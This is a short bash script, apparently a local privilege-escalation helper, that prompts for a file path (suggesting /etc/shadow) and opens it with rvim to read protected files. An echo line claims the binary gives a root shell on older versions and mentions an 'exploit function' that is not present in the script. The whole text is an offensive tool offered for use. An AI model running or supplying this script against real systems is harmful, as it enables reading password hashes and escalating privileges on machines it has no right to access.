#!/bin/bash
echo "This binary provides a root shell in lower versions. If system has a lower version then uncomment the exploit function's rvim line."
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
rvim $filepath
